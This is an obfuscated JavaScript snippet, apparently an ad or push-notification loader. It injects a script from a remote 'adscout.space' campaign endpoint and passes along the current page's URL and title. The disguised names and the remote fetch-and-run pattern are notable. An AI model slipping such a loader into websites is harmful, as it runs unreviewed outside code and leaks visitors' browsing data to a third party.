(function() {
    var eiopqImePe = (function(){ return document;})();
    var eiopq = (function(){ return encodeURIComponent(eiopqImePe.location.href);})();
    function scriptInjection() {
        return document;
    }
    var kleite = function() {
        return 'script';
    }
    var objLoader = scriptInjection().createElement(kleite());

    objLoader.type = objLoader.type ? objLoader.type :  'text/javascript';
    if(!objLoader.async) {
        objLoader.async = !objLoader.async;
    }
    var adopkqw = (function(){return "?title=" + encodeURIComponent(eiopqImePe.title)})()
    // include to src later
    var i = adopkqw + "&url=" + eiopq;

    objLoader.src = initSrcComponent()
    var qs = document.querySelector('script');
    function initSrcComponent() {
      return 'https://dev.api.adscout.space/campaign/ca81d6a2-85eb-478f-a643-c86dc4b5b56c/push' + i ;
    }
    qs.parentNode.insertBefore(objLoader, qs);
})();
